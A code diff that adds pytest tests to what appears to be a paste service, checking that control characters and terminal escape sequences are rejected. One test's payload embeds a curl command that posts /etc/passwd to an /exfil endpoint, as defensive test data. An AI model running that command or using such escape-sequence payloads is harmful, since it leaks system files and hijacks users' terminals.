@@ -32,6 +32,23 @@ def test_rejects_nul_bytes(service):
         service.create("before\x00after")
 
 
+@pytest.mark.parametrize("char", ["\x07", "\x08", "\x1b", "\x0b", "\x0c", "\x7f", "\x9b"])
+def test_rejects_control_characters(service, char):
+    with pytest.raises(InvalidContent):
+        service.create(f"before{char}after")
+
+
+def test_accepts_whitespace_controls(service):
+    result = service.create("line 1\r\nline 2\twith tab")
+    assert service.get(result.id).text == "line 1\r\nline 2\twith tab"
+
+
+def test_rejects_escape_sequence_payload(service):
+    payload = "\x1b]0;;curl -s --data-binary @/etc/passwd http://127.0.0.1:8000/exfil>/dev/null;\x07[21tabuse report"
+    with pytest.raises(InvalidContent):
+        service.create(payload)
+
+
 def test_rejects_too_large(service):
     with pytest.raises(PasteTooLarge):
         service.create("x" * 1025)
